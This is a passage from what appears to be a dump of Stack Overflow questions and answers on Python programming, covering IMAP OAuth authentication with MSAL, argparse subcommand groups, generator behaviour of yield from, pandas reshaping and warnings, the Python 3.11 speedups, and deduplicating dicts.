<a href=""https://learn.microsoft.com/en-us/exchange/client-developer/legacy-protocols/how-to-authenticate-an-imap-pop-smtp-application-by-using-oauth"" rel=""noreferrer"">Authenticate an IMAP, POP or SMTP connection using OAuth</a></p>
<ol>
<li>Register the Application in your Tenant</li>
<li>Setup a Client-Key for the application</li>
<li>Setup the API permissions, select the APIs my organization uses tab and search for &quot;Office 365 Exchange Online&quot; -&gt; Application permissions -&gt; Choose IMAP and IMAP.AccessAsApp</li>
<li>Setup the Service Principal and full access for your Application on the mailbox</li>
<li>Check if IMAP is activated for the mailbox</li>
</ol>
<p>Thats the code I use to test it:</p>
<pre><code>import imaplib
import msal
import pprint

conf = {
    &quot;authority&quot;: &quot;https://login.microsoftonline.com/XXXXyourtenantIDXXXXX&quot;,
    &quot;client_id&quot;: &quot;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXXX&quot;, #AppID
    &quot;scope&quot;: ['https://outlook.office365.com/.default'],
    &quot;secret&quot;: &quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;, #Key-Value
    &quot;secret-id&quot;: &quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;, #Key-ID
}
    
def generate_auth_string(user, token):
    return f&quot;user={user}\x01auth=Bearer {token}\x01\x01&quot;    

if __name__ == &quot;__main__&quot;:
    app = msal.ConfidentialClientApplication(conf['client_id'], authority=conf['authority'],
                                             client_credential=conf['secret'])

    result = app.acquire_token_silent(conf['scope'], account=None)

    if not result:
        print(&quot;No suitable token in cache.  Get new one.&quot;)
        result = app.acquire_token_for_client(scopes=conf['scope'])

    if &quot;access_token&quot; in result:
        print(result['token_type'])
        pprint.pprint(result)
    else:
        print(result.get(&quot;error&quot;))
        print(result.get(&quot;error_description&quot;))
        print(result.get(&quot;correlation_id&quot;))
        
    imap = imaplib.IMAP4('outlook.office365.com')
    imap.starttls()
    imap.authenticate(&quot;XOAUTH2&quot;, lambda x: generate_auth_string(&quot;target_mailbox@example.com&quot;, result['access_token']).encode(&quot;utf-8&quot;))
</code></pre>
<p>After setting up the Service Principal and giving the App full access on the mailbox, wait 15 - 30 minutes for the changes to take effect and test it.</p>
"
"74752610","1","How to use argparse to create command groups like git?","<p>I'm trying to figure out how to use properly builtin <a href=""https://docs.python.org/3/library/argparse.html"" rel=""noreferrer"">argparse</a> module to get a similar output than tools
such as git where I can display a nice help with all &quot;root commands&quot; nicely grouped, ie:</p>
<pre><code>$ git --help
usage: git [--version] [--help] [-C &lt;path&gt;] [-c &lt;name&gt;=&lt;value&gt;]
           [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path]
           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
           [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;]
           [--super-prefix=&lt;path&gt;] [--config-env=&lt;name&gt;=&lt;envvar&gt;]
           &lt;command&gt; [&lt;args&gt;]

These are common Git commands used in various situations:

start a working area (see also: git help tutorial)
   clone     Clone a repository into a new directory
   init      Create an empty Git repository or reinitialize an existing one

work on the current change (see also: git help everyday)
   add       Add file contents to the index
   mv        Move or rename a file, a directory, or a symlink
   restore   Restore working tree files
   rm        Remove files from the working tree and from the index

examine the history and state (see also: git help revisions)
   bisect    Use binary search to find the commit that introduced a bug
   diff      Show changes between commits, commit and working tree, etc
   grep      Print lines matching a pattern
   log       Show commit logs
   show      Show various types of objects
   status    Show the working tree status

grow, mark and tweak your common history
   branch    List, create, or delete branches
   commit    Record changes to the repository
   merge     Join two or more development histories together
   rebase    Reapply commits on top of another base tip
   reset     Reset current HEAD to the specified state
   switch    Switch branches
   tag       Create, list, delete or verify a tag object signed with GPG

collaborate (see also: git help workflows)
   fetch     Download objects and refs from another repository
   pull      Fetch from and integrate with another repository or a local branch
   push      Update remote refs along with associated objects

'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help &lt;command&gt;' or 'git help &lt;concept&gt;'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.
</code></pre>
<p>Here's my attempt:</p>
<pre><code>from argparse import ArgumentParser


class FooCommand:
    def __init__(self, subparser):
        self.name = &quot;Foo&quot;
        self.help = &quot;Foo help&quot;
        subparser.add_parser(self.name, help=self.help)


class BarCommand:
    def __init__(self, subparser):
        self.name = &quot;Bar&quot;
        self.help = &quot;Bar help&quot;
        subparser.add_parser(self.name, help=self.help)


class BazCommand:
    def __init__(self, subparser):
        self.name = &quot;Baz&quot;
        self.help = &quot;Baz help&quot;
        subparser.add_parser(self.name, help=self.help)


def test1():
    parser = ArgumentParser(description=&quot;Test1 ArgumentParser&quot;)
    root = parser.add_subparsers(dest=&quot;command&quot;, description=&quot;All Commands:&quot;)

    # Group1
    FooCommand(root)
    BarCommand(root)

    # Group2
    BazCommand(root)

    args = parser.parse_args()
    print(args)


def test2():
    parser = ArgumentParser(description=&quot;Test2 ArgumentParser&quot;)

    # Group1
    cat1 = parser.add_subparsers(dest=&quot;command&quot;, description=&quot;Category1 Commands:&quot;)
    FooCommand(cat1)
    BarCommand(cat1)

    # Group2
    cat2 = parser.add_subparsers(dest=&quot;command&quot;, description=&quot;Category2 Commands:&quot;)
    BazCommand(cat2)

    args = parser.parse_args()
    print(args)
</code></pre>
<p>If you run <code>test1</code> you'd get:</p>
<pre><code>$ python mcve.py --help
usage: mcve.py [-h] {Foo,Bar,Baz} ...

Test1 ArgumentParser

options:
  -h, --help     show this help message and exit

subcommands:
  All Commands:

  {Foo,Bar,Baz}
    Foo          Foo help
    Bar          Bar help
    Baz          Baz help
</code></pre>
<p>Obviously this is not what I want, in there I just see all commands in a flat list, no groups or whatsoever... so the next logical attempt would be trying to group them. But if I run <code>test2</code> I'll get:</p>
<pre><code>$ python mcve.py --help
usage: mcve.py [-h] {Foo,Bar} ...
mcve.py: error: cannot have multiple subparser arguments
</code></pre>
<p>Which obviously means I'm not using properly argparse to accomplish the task at hand. So, is it possible to use argparse to achieve a similar behaviour than git? In the past I've relied on &quot;hacks&quot; so I thought the best practice here would be using the concept of <code>add_subparsers</code> but it seems I didn't understand properly that concept.</p>
","74772609","<p>This isn't supported natively by <code>argparse</code> -- you can't nest subparsers, so if you want this sort of cli using argparse you're going to need to build a lot of logic on top of <code>argparse</code>. You can set <code>nargs=argparse.REMAINDER</code> to collect a subcommand and arguments without having them parsed by argparse, which means we can build something like this:</p>
<pre><code>import argparse
import copy


class Command:
    def __init__(self):
        self.subcommands = {}
        self.parser = argparse.ArgumentParser()

    def add_subcommand(self, name, sub):
        self.subcommands[name] = sub

    def add_argument(self, *args, **kwargs):
        return self.parser.add_argument(*args, **kwargs)

    def parse_args(self, args=None):
        if not self.subcommands:
            args = self.parser.parse_args(args)
            return args

        p = copy.deepcopy(self.parser)
        p.add_argument(&quot;subcommand&quot;)
        p.add_argument(&quot;args&quot;, nargs=argparse.REMAINDER)
        args = p.parse_args(args)

        try:
            sub = self.subcommands[args.subcommand]
        except KeyError:
            return self.parser.parse_args(args)

        sub_args = sub.parse_args(args.args)

        for attr in dir(sub_args):
            if attr.startswith(&quot;_&quot;):
                continue
            setattr(args, attr, getattr(sub_args, attr))

        return args


def main():
    root = Command()
    root.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, action=&quot;count&quot;)

    cmd1 = Command()
    cmd1_foo = Command()
    cmd1_foo.add_argument(&quot;-n&quot;, &quot;--name&quot;)
    cmd1.add_subcommand(&quot;foo&quot;, cmd1_foo)
    root.add_subcommand(&quot;cmd1&quot;, cmd1)

    cmd2 = Command()
    cmd2_bar = Command()
    cmd2_bar.add_argument(&quot;-s&quot;, &quot;--size&quot;, type=int)
    cmd2.add_subcommand(&quot;bar&quot;, cmd2_bar)
    root.add_subcommand(&quot;cmd2&quot;, cmd2)

    print(root.parse_args())


if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<p>This is horrible and ugly and poorly structured, but it means we can do this:</p>
<pre><code>$ python argtest.py --verbose cmd1 foo --name lars
Namespace(verbose=1, subcommand='foo', args=['--name', 'lars'], name='lars')
</code></pre>
<p>Or this:</p>
<pre><code>$ python argtest.py --verbose cmd2 bar --size 10
Namespace(verbose=1, subcommand='bar', args=['--size', '10'], size=10)
</code></pre>
<hr />
<p>If you're willing to look beyond <code>argparse</code>, libraries like <a href=""https://click.palletsprojects.com/en/8.1.x/"" rel=""noreferrer"">Click</a> and <a href=""https://typer.tiangolo.com/"" rel=""noreferrer"">Typer</a> make things much easier. For example, the above command could be implemented using Click like this:</p>
<pre><code>import click

@click.group()
def main():
    pass

@main.group()
def cmd1():
    pass

@cmd1.command()
@click.option('-n', '--name')
def foo(name):
    pass

@main.group()
def cmd2():
    pass


@cmd2.command()
@click.option('-s', '--size', type=int)
def bar():
    pass

if __name__ == '__main__':
    main()
</code></pre>
<p>So much nicer!</p>
"
"74922314","1","yield from vs yield in for-loop","<p>My understanding of <code>yield from</code> is that it is similar to <code>yield</code>ing every item from an iterable. Yet, I observe the different behavior in the following example.</p>
<p>I have <code>Class1</code></p>
<pre><code>class Class1:
    def __init__(self, gen):
        self.gen = gen
        
    def __iter__(self):
        for el in self.gen:
            yield el
</code></pre>
<p>and Class2 that different only in replacing <code>yield</code> in for loop with <code>yield from</code></p>
<pre><code>class Class2:
    def __init__(self, gen):
        self.gen = gen
        
    def __iter__(self):
        yield from self.gen
</code></pre>
<p>The code below reads the first element from an instance of a given class and then reads the rest in a for loop:</p>
<pre><code>a = Class1((i for i in range(3)))
print(next(iter(a)))
for el in iter(a):
    print(el)
</code></pre>
<p>This produces different outputs for <code>Class1</code> and <code>Class2</code>. For <code>Class1</code> the output is</p>
<pre><code>0
1
2
</code></pre>
<p>and for <code>Class2</code> the output is</p>
<pre><code>0
</code></pre>
<p><a href=""https://godbolt.org/z/sjb54zcTx"" rel=""noreferrer"">Live demo</a></p>
<p>What is the mechanism behind <code>yield from</code> that produces different behavior?</p>
","74923483","<h3>What Happened?</h3>
<p>When you use <code>next(iter(instance_of_Class2))</code>, <code>iter()</code> calls <code>.close()</code> on the inner generator when it (the iterator, not the generator!) goes out of scope (and is deleted), while with <code>Class1</code>, <code>iter()</code> only closes its instance</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; g = (i for i in range(3))
&gt;&gt;&gt; b = Class2(g)
&gt;&gt;&gt; i = iter(b)     # hold iterator open
&gt;&gt;&gt; next(i)
0
&gt;&gt;&gt; next(i)
1
&gt;&gt;&gt; del(i)          # closes g
&gt;&gt;&gt; next(iter(b))
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
StopIteration
</code></pre>
<p>This behavior is described in PEP 342 in two parts</p>
<ul>
<li><a href=""https://peps.python.org/pep-0342/#new-generator-method-close"" rel=""noreferrer"">the new <code>.close()</code> method</a> (well, new to Python 2.5)</li>
<li>from the <a href=""https://peps.python.org/pep-0342/#specification-summary"" rel=""noreferrer"">Specification Summary</a>
<blockquote>
<ol start=""5"">
<li>Add support to ensure that close() is called when a generator iterator is garbage-collected.</li>
</ol>
</blockquote>
</li>
</ul>
<p>What happens is a little clearer (if perhaps surprising) when multiple generator delegations occur; only the generator being delegated is closed when its wrapping <code>iter</code> is deleted</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; g1 = (a for a in range(10))
&gt;&gt;&gt; g2 = (a for a in range(10, 20))
&gt;&gt;&gt; def test3():
...     yield from g1
...     yield from g2
... 
&gt;&gt;&gt; next(test3())
0
&gt;&gt;&gt; next(test3())
10
&gt;&gt;&gt; next(test3())
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
StopIteration
</code></pre>
<hr />
<h3>Fixing <code>Class2</code></h3>
<p>What options are there to make <code>Class2</code> behave more the way you expect?</p>
<p>Notably, other strategies, though they don't have the visually pleasing <a href=""https://en.wikipedia.org/wiki/Syntactic_sugar"" rel=""noreferrer"">sugar</a> of <code>yield from</code> or some of its <a href=""https://stackoverflow.com/a/59600668/4541045"">potential benefits</a> gives you a way to interact with the values, which seems like a primary benefit</p>
<ul>
<li>avoid creating a structure like this at all (&quot;just don't do that!&quot;)<br />
if you don't interact with the generator and don't intend to keep a reference to the iterator, why bother wrapping it at all? (see above comment about interacting)</li>
<li>create the iterator yourself internally (this may be what you expected)
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; class Class3:
...     def __init__(self, gen):
...         self.iterator = iter(gen)
...         
...     def __iter__(self):
...         return self.iterator
... 
&gt;&gt;&gt; c = Class3((i for i in range(3)))
&gt;&gt;&gt; next(iter(c))
0
&gt;&gt;&gt; next(iter(c))
1
</code></pre>
</li>
<li>make the whole class a &quot;proper&quot; Generator<br />
while testing this, it plausibly highlights some <code>iter()</code> inconsistency - see comments below (ie. why isn't <code>e</code> closed?)<br />
also an opportunity to pass multiple generators with <code>itertools.chain.from_iterable</code>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; class Class5(collections.abc.Generator):
...     def __init__(self, gen):
...         self.gen = gen
...     def send(self, value):
...         return next(self.gen)
...     def throw(self, value):
...         raise StopIteration
...     def close(self):          # optional, but more complete
...         self.gen.close()
... 
&gt;&gt;&gt; e = Class5((i for i in range(10)))
&gt;&gt;&gt; next(e)        # NOTE iter is not necessary!
0
&gt;&gt;&gt; next(e)
1
&gt;&gt;&gt; next(iter(e))  # but still works
2
&gt;&gt;&gt; next(iter(e))  # doesn't close e?? (should it?)
3
&gt;&gt;&gt; e.close()
&gt;&gt;&gt; next(e)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;/usr/lib/python3.9/_collections_abc.py&quot;, line 330, in __next__
    return self.send(None)
  File &quot;&lt;stdin&gt;&quot;, line 5, in send
StopIteration
</code></pre>
</li>
</ul>
<hr />
<h3>Hunting the Mystery</h3>
<p>A better clue is that if you directly try again, <code>next(iter(instance))</code> raises <code>StopIteration</code>, indicating the generator is permanently closed (either through exhaustion or <code>.close()</code>), and why iterating over it with a <code>for</code> loop yields no more values</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; a = Class1((i for i in range(3)))
&gt;&gt;&gt; next(iter(a))
0
&gt;&gt;&gt; next(iter(a))
1
&gt;&gt;&gt; b = Class2((i for i in range(3)))
&gt;&gt;&gt; next(iter(b))
0
&gt;&gt;&gt; next(iter(b))
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
StopIteration
</code></pre>
<p>However, if we name the iterator, it works as expected</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; b = Class2((i for i in range(3)))
&gt;&gt;&gt; i = iter(b)
&gt;&gt;&gt; next(i)
0
&gt;&gt;&gt; next(i)
1
&gt;&gt;&gt; j = iter(b)
&gt;&gt;&gt; next(j)
2
&gt;&gt;&gt; next(i)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
StopIteration
</code></pre>
<p>To me, this suggests that when the iterator doesn't have a name, it calls <code>.close()</code> when it goes out of scope</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; def gen_test(iterable):
...     yield from iterable
... 
&gt;&gt;&gt; g = gen_test((i for i in range(3)))
&gt;&gt;&gt; next(iter(g))
0
&gt;&gt;&gt; g.close()
&gt;&gt;&gt; next(iter(g))
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
StopIteration
</code></pre>
<p>Disassembling the result, we find the internals are a little different</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; a = Class1((i for i in range(3)))
&gt;&gt;&gt; dis.dis(a.__iter__)
  6           0 LOAD_FAST                0 (self)
              2 LOAD_ATTR                0 (gen)
              4 GET_ITER
        &gt;&gt;    6 FOR_ITER                10 (to 18)
              8 STORE_FAST               1 (el)

  7          10 LOAD_FAST                1 (el)
             12 YIELD_VALUE
             14 POP_TOP
             16 JUMP_ABSOLUTE            6
        &gt;&gt;   18 LOAD_CONST               0 (None)
             20 RETURN_VALUE
&gt;&gt;&gt; b = Class2((i for i in range(3)))
&gt;&gt;&gt; dis.dis(b.__iter__)
  6           0 LOAD_FAST                0 (self)
              2 LOAD_ATTR                0 (gen)
              4 GET_YIELD_FROM_ITER
              6 LOAD_CONST               0 (None)
              8 
             10 POP_TOP
             12 LOAD_CONST               0 (None)
             14 RETURN_VALUE
</code></pre>
<p>Notably, the <code>yield from</code> version has <a href=""https://docs.python.org/3/library/dis.html#opcode-GET_YIELD_FROM_ITER"" rel=""noreferrer""><code>GET_YIELD_FROM_ITER</code></a></p>
<blockquote>
<p>If <code>TOS</code> is a generator iterator or coroutine object it is left as is. Otherwise, implements <code>TOS = iter(TOS)</code>.</p>
</blockquote>
<p>(subtly, <code>YIELD_FROM</code> keyword appears to be removed in 3.11)</p>
<p>So if the given iterable (to the class) <em>is</em> a generator iterator, it'll be handed off directly, giving the result we (might) expect</p>
<hr />
<h3>Extras</h3>
<p>Passing an iterator which isn't a generator (<code>iter()</code> creates a new iterator each time in both cases)</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; a = Class1([i for i in range(3)])
&gt;&gt;&gt; next(iter(a))
0
&gt;&gt;&gt; next(iter(a))
0
&gt;&gt;&gt; b = Class2([i for i in range(3)])
&gt;&gt;&gt; next(iter(b))
0
&gt;&gt;&gt; next(iter(b))
0
</code></pre>
<p>Expressly closing <code>Class1</code>'s internal generator</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; g = (i for i in range(3))
&gt;&gt;&gt; a = Class1(g)
&gt;&gt;&gt; next(iter(a))
0
&gt;&gt;&gt; next(iter(a))
1
&gt;&gt;&gt; a.gen.close()
&gt;&gt;&gt; next(iter(a))
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
StopIteration
</code></pre>
<p>generator is only closed by <code>iter</code> when deleted if instance is popped</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; g = (i for i in range(10))
&gt;&gt;&gt; b = Class2(g)
&gt;&gt;&gt; i = iter(b)
&gt;&gt;&gt; next(i)
0
&gt;&gt;&gt; j = iter(b)
&gt;&gt;&gt; del(j)        # next() not called on j
&gt;&gt;&gt; next(i)
1
&gt;&gt;&gt; j = iter(b)
&gt;&gt;&gt; next(j)
2
&gt;&gt;&gt; del(j)        # generator closed
&gt;&gt;&gt; next(i)       # now fails, despite range(10) above
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
StopIteration
</code></pre>
"
"74893662","1","Transpose pandas DF based on value data type","<p>I have pandas <code>DataFrame</code> A. I am struggling transforming this into my desired format, see <code>DataFrame</code> B. I tried <code>pivot</code> or <code>melt</code> but I am not sure how I could make it conditional (<code>string</code> values to <code>FIELD_STR_VALUE</code>, <code>numeric</code> values to <code>FIELD_NUM_VALUE</code>). I was hoping you could point me the right direction.</p>
<p>A: Input DataFrame</p>
<pre><code>|FIELD_A |FIELD_B |FIELD_C |FIELD_D |
|--------|--------|--------|--------|
|123123  |8       |a       |23423   |
|123124  |7       |c       |6464    |
|123144  |99      |x       |234     |
</code></pre>
<p>B: Desired output DataFrame</p>
<pre><code>|ID |FIELD_A |FIELD_NAME |FIELD_STR_VALUE |FIELD_NUM_VALUE |
|---|--------|-----------|----------------|----------------|
|1  |123123  |B          |                |8               |
|2  |123123  |C          |a               |                |
|3  |123123  |D          |                |23423           |
|4  |123124  |B          |                |7               |
|5  |123124  |C          |c               |                |
|6  |123124  |D          |                |6464            |
|7  |123144  |B          |                |99              |
|8  |123144  |C          |x               |                |
|9  |123144  |D          |                |234             |
</code></pre>
","74893842","<p>You can use:</p>
<pre><code># dic = {np.int64: 'NUM', object: 'STR'}

(df.set_index('FIELD_A')
   .pipe(lambda d: d.set_axis(pd.MultiIndex.from_arrays(
          [d.columns, d.dtypes],
         # or for custom NAMES
         #[d.columns, d.dtypes.map(dic)],
                              names=['FIELD_NAME', None]),
                              axis=1)
        )
   .stack(0).add_prefix('FIELD_').add_suffix('_VALUE')
   .reset_index()
)
</code></pre>
<p><em>NB. if you really want STR/NUM, <code>map</code> those strings from the dtypes (see comments in code).</em></p>
<p>Output:</p>
<pre><code>   FIELD_A FIELD_NAME  FIELD_int64_VALUE FIELD_object_VALUE
0   123123    FIELD_B                8.0                NaN
1   123123    FIELD_C                NaN                  a
2   123123    FIELD_D            23423.0                NaN
3   123124    FIELD_B                7.0                NaN
4   123124    FIELD_C                NaN                  c
5   123124    FIELD_D             6464.0                NaN
6   123144    FIELD_B               99.0                NaN
7   123144    FIELD_C                NaN                  x
8   123144    FIELD_D              234.0                NaN
</code></pre>
"
"74057367","1","How to get rid of the in place FutureWarning when setting an entire column from an array?","<p>In pandas v.1.5.0 <a href=""https://pandas.pydata.org/docs/dev/whatsnew/v1.5.0.html#inplace-operation-when-setting-values-with-loc-and-iloc"" rel=""noreferrer"">a new warning has been added</a>, which is shown, when a column is set from an array of different dtype. The <code>FutureWarning</code> informs about a planned semantic change, when using <code>iloc</code>: the change will be done in-place in future versions. The <a href=""https://pandas.pydata.org/docs/dev/whatsnew/v1.5.0.html#inplace-operation-when-setting-values-with-loc-and-iloc"" rel=""noreferrer"">changelog</a> instructs what to do to get the old behavior, but there is no hint how to handle the situation, when in-place operation is in fact the right choice.</p>
<p>The example from the changelog:</p>
<pre class=""lang-py prettyprint-override""><code>df = pd.DataFrame({'price': [11.1, 12.2]}, index=['book1', 'book2'])
original_prices = df['price']
new_prices = np.array([98, 99])
df.iloc[:, 0] = new_prices
df.iloc[:, 0]
</code></pre>
<p>This is the warning, which is printed in pandas 1.5.0:</p>
<blockquote>
<p>FutureWarning: In a future version, <code>df.iloc[:, i] = newvals</code> will
attempt to set the values inplace instead of always setting a new
array. To retain the old behavior, use either <code>df[df.columns[i]] = newvals</code> or, if columns are non-unique, <code>df.isetitem(i, newvals)</code></p>
</blockquote>
<p>How to get rid of the warning, if I don't care about in-place or not, but want to get rid of the warning? Am I supposed to change dtype explicitly? Do I really need to catch the warning every single time I need to use this feature? Isn't there a better way?</p>
","74193599","<p>I haven't found any better way than suppressing the warning using the <code>warnings</code> module:</p>
<pre><code>import numpy as np
import pandas as pd
import warnings

df = pd.DataFrame({&quot;price&quot;: [11.1, 12.2]}, index=[&quot;book1&quot;, &quot;book2&quot;])
original_prices = df[&quot;price&quot;]
new_prices = np.array([98, 99])
with warnings.catch_warnings():
    # Setting values in-place is fine, ignore the warning in Pandas &gt;= 1.5.0
    # This can be removed, if Pandas 1.5.0 does not need to be supported any longer.
    # See also: https://stackoverflow.com/q/74057367/859591
    warnings.filterwarnings(
        &quot;ignore&quot;,
        category=FutureWarning,
        message=(
            &quot;.*will attempt to set the values inplace instead of always setting a new array. &quot;
            &quot;To retain the old behavior, use either.*&quot;
        ),
    )

    df.iloc[:, 0] = new_prices

df.iloc[:, 0]
</code></pre>
"
"74206978","1","Why does this specific code run faster in Python 3.11?","<p>I have the following code in a Python file called <code>benchmark.py</code>.</p>
<pre><code>source = &quot;&quot;&quot;
for i in range(1000):
    a = len(str(i)) 
&quot;&quot;&quot;

import timeit

print(timeit.timeit(stmt=source, number=100000))
</code></pre>
<p>When I tried to run with multiple python versions I am seeing a drastic performance difference.</p>
<pre><code>C:\Users\Username\Desktop&gt;py -3.10 benchmark.py
16.79652149998583

C:\Users\Username\Desktop&gt;py -3.11 benchmark.py
10.92280820000451
</code></pre>
<p>As you can see this code runs faster with python 3.11 than previous Python versions. I tried to disassemble the bytecode to understand the reason for this behaviour but I could only see a difference in opcode names (<code>CALL_FUNCTION</code> is replaced by <code>PRECALL</code> and <code>CALL</code> opcodes).</p>
<p>I am quite not sure if that's the reason for this performance change. so I am looking for an answer that <strong>justifies with reference to cpython
source code</strong>.</p>
<p><strong><code>python 3.11</code> bytecode</strong></p>
<pre><code>  0           0 RESUME                   0

  2           2 PUSH_NULL
              4 LOAD_NAME                0 (range)
              6 LOAD_CONST               0 (1000)
              8 PRECALL                  1
             12 CALL                     1
             22 GET_ITER
        &gt;&gt;   24 FOR_ITER                22 (to 70)
             26 STORE_NAME               1 (i)

  3          28 PUSH_NULL
             30 LOAD_NAME                2 (len)
             32 PUSH_NULL
             34 LOAD_NAME                3 (str)
             36 LOAD_NAME                1 (i)
             38 PRECALL                  1
             42 CALL                     1
             52 PRECALL                  1
             56 CALL                     1
             66 STORE_NAME               4 (a)
             68 JUMP_BACKWARD           23 (to 24)

  2     &gt;&gt;   70 LOAD_CONST               1 (None)
             72 RETURN_VALUE
</code></pre>
<p><strong><code>python 3.10</code> bytecode</strong></p>
<pre><code>  2           0 LOAD_NAME                0 (range)
              2 LOAD_CONST               0 (1000)
              4 CALL_FUNCTION            1
              6 GET_ITER
        &gt;&gt;    8 FOR_ITER                 8 (to 26)
             10 STORE_NAME               1 (i)

  3          12 LOAD_NAME                2 (len)
             14 LOAD_NAME                3 (str)
             16 LOAD_NAME                1 (i)
             18 CALL_FUNCTION            1
             20 CALL_FUNCTION            1
             22 STORE_NAME               4 (a)
             24 JUMP_ABSOLUTE            4 (to 8)

  2     &gt;&gt;   26 LOAD_CONST               1 (None)
             28 RETURN_VALUE
</code></pre>
<p>PS: I understand that <em>python 3.11</em> introduced bunch of performance improvements but I am curios to understand what optimization makes this code run faster in python 3.11</p>
","74220032","<p>There's a big section in the <a href=""https://docs.python.org/3.11/whatsnew/3.11.html"" rel=""noreferrer"">&quot;what's new&quot;</a> page labeled <a href=""https://docs.python.org/3.11/whatsnew/3.11.html#faster-cpython"" rel=""noreferrer"">&quot;faster runtime&quot;</a>. It looks like the most likely cause of the speedup here is <a href=""https://docs.python.org/3.11/whatsnew/3.11.html#pep-659-specializing-adaptive-interpreter"" rel=""noreferrer"">PEP 659</a>, which is a first start towards JIT optimization (perhaps not quite JIT <em>compilation</em>, but definitely JIT <em>optimization</em>).</p>
<p>Particularly, the lookup and call for <code>len</code> and <code>str</code> now bypass a lot of dynamic machinery in the overwhelmingly common case where the built-ins aren't shadowed or overridden. The global and builtin dict lookups to resolve the name get skipped in a fast path, and the underlying C routines for <code>len</code> and <code>str</code> are called directly, instead of going through the general-purpose function call handling.</p>
<p>You wanted source references, so here's one. The <code>str</code> call will get specialized in <a href=""https://github.com/python/cpython/blob/v3.11.0/Python/specialize.c#L1356"" rel=""noreferrer""><code>specialize_class_call</code></a>:</p>
<pre><code>    if (tp-&gt;tp_flags &amp; Py_TPFLAGS_IMMUTABLETYPE) {
        if (nargs == 1 &amp;&amp; kwnames == NULL &amp;&amp; oparg == 1) {
            if (tp == &amp;PyUnicode_Type) {
                _Py_SET_OPCODE(*instr, PRECALL_NO_KW_STR_1);
                return 0;
            }
</code></pre>
<p>where it detects that the call is a call to the <code>str</code> builtin with 1 positional argument and no keywords, and replaces the corresponding <code>PRECALL</code> opcode with <code>PRECALL_NO_KW_STR_1</code>. The handling for the <code>PRECALL_NO_KW_STR_1</code> opcode in the bytecode evaluation loop looks like <a href=""https://github.com/python/cpython/blob/v3.11.0/Python/ceval.c#L4931"" rel=""noreferrer"">this</a>:</p>
<pre><code>        TARGET(PRECALL_NO_KW_STR_1) {
            assert(call_shape.kwnames == NULL);
            assert(cframe.use_tracing == 0);
            assert(oparg == 1);
            DEOPT_IF(is_method(stack_pointer, 1), PRECALL);
            PyObject *callable = PEEK(2);
            DEOPT_IF(callable != (PyObject *)&amp;PyUnicode_Type, PRECALL);
            STAT_INC(PRECALL, hit);
            SKIP_CALL();
            PyObject *arg = TOP();
            PyObject *res = PyObject_Str(arg);
            Py_DECREF(arg);
            Py_DECREF(&amp;PyUnicode_Type);
            STACK_SHRINK(2);
            SET_TOP(res);
            if (res == NULL) {
                goto error;
            }
            CHECK_EVAL_BREAKER();
            DISPATCH();
        }
</code></pre>
<p>which consists mostly of a bunch of safety prechecks and reference fiddling wrapped around a call to <code>PyObject_Str</code>, the C routine for calling <code>str</code> on an object.</p>
<p>Python 3.11 includes many other performance enhancements besides the above, including optimizations to stack frame creation, method lookup, common arithmetic operations, interpreter startup, and more. Most code should run much faster now, barring things like I/O-bound workloads and code that spent most of its time in C library code (like NumPy).</p>
"
"74965764","1","How can I properly hash dictionaries with a common set of keys, for deduplication purposes?","<p>I have some log data like:</p>
<pre><code>logs = [
 {'id': '1234', 'error': None, 'fruit': 'orange'},
 {'id': '12345', 'error': None, 'fruit': 'apple'}
]
</code></pre>
<p>Each dict has the same keys: <code>'id'</code>, <code>'error'</code> and <code>'fruit'</code> (in this example).</p>
<p>I want to <a href=""https://stackoverflow.com/questions/7961363"">remove duplicates</a> from this list, but straightforward <code>dict</code> and <code>set</code> based approaches do not work because my elements are themselves <code>dict</code>s, which are <a href=""https://stackoverflow.com/questions/1151658"">not hashable</a>:</p>
<pre><code>&gt;&gt;&gt; set(logs)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
TypeError: unhashable type: 'dict'
</code></pre>
<p>Another approach is to <a href=""https://stackoverflow.com/questions/2213923"">sort and use itertools.groupby</a> - but dicts are also not comparable, so this also does not work:</p>
<pre><code>&gt;&gt;&gt; from itertools import groupby
&gt;&gt;&gt; [k for k, _ in groupby(sorted(logs))]
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
TypeError: '&lt;' not supported between instances of 'dict' and 'dict'
</code></pre>
<p>I had the idea to calculate a hash value for each log entry, and store it in a <code>set</code> for comparison, like so:</p>
<pre><code>def compute_hash(log_dict: dict):
    return hash(log_dict.values())

def deduplicate(logs):
    already_seen = set()
